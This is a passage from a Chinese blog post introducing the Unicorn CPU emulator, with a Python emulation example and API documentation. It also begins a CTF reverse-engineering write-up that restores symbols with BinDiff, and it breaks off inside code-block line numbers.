title="unicorn使用指南"></a>unicorn使用指南</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#简单模拟寄存器的值加减</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#被模拟的代码</span><br>X86_CODE32 = <span class="hljs-string">b&quot;\x41\x4a&quot;</span> <span class="hljs-comment"># INC ecx; DEC edx</span><br><br><span class="hljs-comment"># 模拟器开始的内存地址</span><br>ADDRESS = <span class="hljs-number">0x1000000</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Emulate i386 code&quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#初始化模拟器为x86_32</span><br>    mu = Uc(UC_ARCH_X86, UC_MODE_32)<br><br>    <span class="hljs-comment">#为这个模拟器分配2M内存</span><br>    mu.mem_map(ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>)<br><br>    <span class="hljs-comment">#将机器码写入内存</span><br>    mu.mem_write(ADDRESS, X86_CODE32)<br><br>    <span class="hljs-comment">#初始化模拟器的寄存器</span><br>    mu.reg_write(UC_X86_REG_ECX, <span class="hljs-number">0x1234</span>)<br>    mu.reg_write(UC_X86_REG_EDX, <span class="hljs-number">0x7890</span>)<br><br>    <span class="hljs-comment">#模拟代码执行（emu_start有四个参数，后两个参数是模拟执行的时间和需要执行的指令数目，这里后两个参数为空，则以无限时间和无限指令模拟执行）</span><br>    mu.emu_start(ADDRESS, ADDRESS + <span class="hljs-built_in">len</span>(X86_CODE32))<br><br>    <span class="hljs-comment">#输出寄存器的值</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Emulation done. Below is the CPU context&quot;</span>)<br><br>    r_ecx = mu.reg_read(UC_X86_REG_ECX)<br>    r_edx = mu.reg_read(UC_X86_REG_EDX)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; ECX = 0x%x&quot;</span> %r_ecx)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&gt;&gt;&gt; EDX = 0x%x&quot;</span> %r_edx)<br><br><span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ERROR: %s&quot;</span> % e)<br></code></pre></td></tr></table></figure><p>常用API：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">Uc</span><span class="hljs-params">(arch, mode)</span></span> 初始化模拟器，相应的参数指定架构<br><span class="hljs-function"><span class="hljs-title">mem_map</span><span class="hljs-params">(address, size)</span></span> 分配内存<br><span class="hljs-function"><span class="hljs-title">mem_write</span><span class="hljs-params">(addreee, code)</span></span> 写入内存<br><span class="hljs-function"><span class="hljs-title">mem_read</span><span class="hljs-params">(address, size)</span></span> 从内存中读取数据。<br><span class="hljs-function"><span class="hljs-title">reg_write</span><span class="hljs-params">(reg, value)</span></span> 写入寄存器<br><span class="hljs-function"><span class="hljs-title">emu_start</span><span class="hljs-params">(address_start, address_end, timeout=<span class="hljs-number">0</span>, count=<span class="hljs-number">0</span>)</span></span> #模拟执行<br><span class="hljs-function"><span class="hljs-title">reg_read</span><span class="hljs-params">(reg)</span></span> 读取寄存器的值<br><span class="hljs-function"><span class="hljs-title">hook_add</span><span class="hljs-params">()</span></span> 特定情况下进行函数回调<br></code></pre></td></tr></table></figure><h1 id="强网杯unicorn-like-a-pro复现"><a href="#强网杯unicorn-like-a-pro复现" class="headerlink" title="强网杯unicorn_like_a_pro复现"></a>强网杯unicorn_like_a_pro复现</h1><h2 id="符号还原"><a href="#符号还原" class="headerlink" title="符号还原"></a>符号还原</h2><p>本题使用了unicorn框架模拟执行一段代码，IDA加载发现没有符号，我们学习并使用bindiff还原符号表。</p><p>bindiff下载地址：<a href="https://www.zynamics.com/software.html">https://www.zynamics.com/software.html</a></p><p>安装好之后，将ida插件拷贝到ida的plugins目录</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729113354364.png" alt="image-20210729113354364"></p><p>然后我们准备需要bindiff的文件，一个是我们本题的题目文件，另一个是编译好的unicorn文件libunicorn.so.1。</p><p>在进行bindiff之前，要拿到两个文件的ida pack文件。</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729120600585.png" alt="image-20210729120600585"></p><p>然后导入符号表：</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729121403431.png" alt="image-20210729121403431"></p><p>设置阀值为0.7，可根据自身情况修改。</p><p><img src="/2021/07/25/unicorn%E5%85%A5%E9%97%A8%E5%8F%8A%E5%BC%BA%E7%BD%91%E6%9D%AFunicorn-like-a-pro%E5%A4%8D%E7%8E%B0/image-20210729132229194.png" alt="image-20210729132229194"></p><h2 id="API解析"><a href="#API解析" class="headerlink" title="API解析"></a>API解析</h2><p><strong>uc_open函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uc_err <span class="hljs-title">uc_open</span><span class="hljs-params">(uc_arch arch, uc_mode mode, uc_engine **uc)</span></span>;<br>创建新的Unicorn实例<br>@arch：架构类型（UC_ARCH_*）<br>@mode：硬件模式。 这是结合 UC_MODE_*<br>@uc：指向uc_engine的指针，返回时会更新<br>@<span class="hljs-keyword">return</span> UC_ERR_OK 成功，或其他值失败（参考 uc_err 枚举详细错误）。<br><br>uc_arch<br>架构选择<br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">enum</span> uc_arch &#123;<br>    UC_ARCH_ARM = <span class="hljs-number">1</span>,    <span class="hljs-comment">// ARM 架构 (包括 Thumb, Thumb-2)</span><br>    UC_ARCH_ARM64,      <span class="hljs-comment">// ARM-64, 也称 AArch64</span><br>    UC_ARCH_MIPS,       <span class="hljs-comment">// Mips 架构</span><br>    UC_ARCH_X86,        <span class="hljs-comment">// X86 架构 (包括 x86 &amp; x86-64)</span><br>    UC_ARCH_PPC,        <span class="hljs-comment">// PowerPC 架构 (暂不支持)</span><br>    UC_ARCH_SPARC,      <span class="hljs-comment">// Sparc 架构</span><br>    UC_ARCH_M68K,       <span class="hljs-comment">// M68K 架构</span><br>    UC_ARCH_MAX,<br>&#125; uc_arch;<br><br>uc_mode<br>模式选择<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">uc_mode</span> &#123;</span><br>    UC_MODE_LITTLE_ENDIAN = <span class="hljs-number">0</span>,    <span class="hljs-comment">// 小端序模式 (默认)</span><br>    UC_MODE_BIG_ENDIAN = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">30</span>, <span class="hljs-comment">// 大端序模式</span><br><br>    <span class="hljs-comment">// arm / arm64</span><br>    UC_MODE_ARM = <span class="hljs-number">0</span>,              <span class="hljs-comment">// ARM 模式</span><br>    UC_MODE_THUMB = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,       <span class="hljs-comment">// THUMB 模式 (包括 Thumb-2)</span><br>    UC_MODE_MCLASS = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>,      <span class="hljs-comment">// ARM&#x27;s Cortex-M 系列 (暂不支持)</span><br>    UC_MODE_V8 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>,          <span class="hljs-comment">// ARMv8 A32 encodings for ARM (暂不支持)</span><br><br>    <span class="hljs-comment">// arm (32bit) cpu 类型</span><br>    UC_MODE_ARM926 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">7</span>,  <span class="hljs-comment">// ARM926 CPU 类型</span><br>    UC_MODE_ARM946 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">8</span>,  <span class="hljs-comment">// ARM946 CPU 类型</span><br>    UC_MODE_ARM1176 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">9</span>,  <span class="hljs-comment">// ARM1176 CPU 类型</span><br><br>    <span class="hljs-comment">// mips</span><br>    UC_MODE_MICRO = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,       <span class="hljs-comment">// MicroMips 模式 (暂不支持)</span><br>    UC_MODE_MIPS3 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">5</span>,       <span class="hljs-comment">// Mips III ISA (暂不支持)</span><br>    UC_MODE_MIPS32R6 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">6</span>,    <span class="hljs-comment">// Mips32r6 ISA (暂不支持)</span><br>    UC_MODE_MIPS32 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,      <span class="hljs-comment">// Mips32 ISA</span><br>    UC_MODE_MIPS64 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,      <span class="hljs-comment">// Mips64 ISA</span><br><br>    <span class="hljs-comment">// x86 / x64</span><br>    UC_MODE_16 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span>,          <span class="hljs-comment">// 16-bit 模式</span><br>    UC_MODE_32 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,          <span class="hljs-comment">// 32-bit 模式</span><br>    UC_MODE_64 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,          <span class="hljs-comment">// 64-bit 模式</span><br><br>    <span class="hljs-comment">// ppc </span><br>    UC_MODE_PPC32 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,       <span class="hljs-comment">// 32-bit 模式 (暂不支持)</span><br>    UC_MODE_PPC64 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,       <span class="hljs-comment">// 64-bit 模式 (暂不支持)</span><br>    UC_MODE_QPX = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,         <span class="hljs-comment">// Quad Processing eXtensions 模式 (暂不支持)</span><br><br>    <span class="hljs-comment">// sparc</span><br>    UC_MODE_SPARC32 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">2</span>,     <span class="hljs-comment">// 32-bit 模式</span><br>    UC_MODE_SPARC64 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">3</span>,     <span class="hljs-comment">// 64-bit 模式</span><br>    UC_MODE_V9 = <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">4</span>,          <span class="hljs-comment">// SparcV9 模式 (暂不支持)</span><br><br>    <span class="hljs-comment">// m68k</span><br>&#125; uc_mode;<br></code></pre></td></tr></table></figure><p><strong>uc_mem_map函数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uc_err <span class="hljs-title">uc_mem_map</span><span class="hljs-params">(uc_engine *uc, <span class="hljs-keyword">uint64_t</span> address, <span class="hljs-keyword">size_t</span> size, <span class="hljs-keyword">uint32_t</span> perms)</span></span>;<br>映射内存<br>  @uc: uc_open() 返回的句柄<br>  @address：要映射到的新内存区域的起始地址。<br>     该地址必须与 <span class="hljs-number">4</span>KB 对齐，否则将返回 UC_ERR_ARG 错误。<br>  @size：要映射到的新内存区域的大小。<br>     此大小必须是 <span class="hljs-number">4</span>KB 的倍数，否则将返回 UC_ERR_ARG 错误。<br>  @perms：新映射区域的权限。<br>     这必须是 UC_PROT_READ | 的某种组合。 UC_PROT_WRITE | UC_PROT_EXEC,<br>否则这将返回 UC_ERR_ARG 错误。<br>  @<span class="hljs-keyword">return</span> UC_ERR_OK 成功，或其他值失败（参考 uc_err 枚举详细错误）。<br>uc_mem_map(uc, <span class="hljs-number">0x1000</span>LL, <span class="hljs-number">0x2000</span>LL, <span class="hljs-number">7LL</span>); <br><span class="hljs-comment">//从0x1000开始分配具有所有权限的0x2000大小的内存</span><br><br>uc_prot<br>新映射区域的权限<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">uc_prot</span> &#123;</span><br>   UC_PROT_NONE = <span class="hljs-number">0</span>,    <span class="hljs-comment">//无</span><br>   UC_PROT_READ = <span class="hljs-number">1</span>,    <span class="hljs-comment">//读取</span><br>   UC_PROT_WRITE = <span class="hljs-number">2</span>,   <span class="hljs-comment">//写入</span><br>   UC_PROT_EXEC = <span class="hljs-number">4</span>,    <span class="hljs-comment">//可执行</span><br>   UC_PROT_ALL = <span class="hljs-number">7</span>,     <span class="hljs-comment">//所有权限</span><br>&#125; uc_prot;<br></code></pre></td></tr></table></figure><p><strong>uc_mem_write</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uc_err <span class="hljs-title">uc_mem_write</span><span class="hljs-params">(uc_engine *uc, <span class="hljs-keyword">uint64_t</span> address, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *bytes, <span class="hljs-keyword">size_t</span> size)</span></span>;<br>写入内存。<br>  @uc: uc_open() 返回的句柄<br>  @address：要设置的字节的起始内存地址。<br>  @bytes：指向包含要写入内存的数据的变量的指针。<br>  @size：要写入的内存大小。<br>  注意：@bytes 必须足够大以包含 @size 字节。<br>  @<span class="hljs-keyword">return</span> UC_ERR_OK 成功，或其他值失败（参考 uc_err 枚举详细错误）<br>uc_mem_write(uc, <span class="hljs-number">0x1000</span>LL, &amp;code, <span class="hljs-number">0x1027</span>LL);<br><span class="hljs-comment">//将code处的数据从0x1000开始写入</span><br></code></pre></td></tr></table></figure><p><strong>uc_hook_add</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span 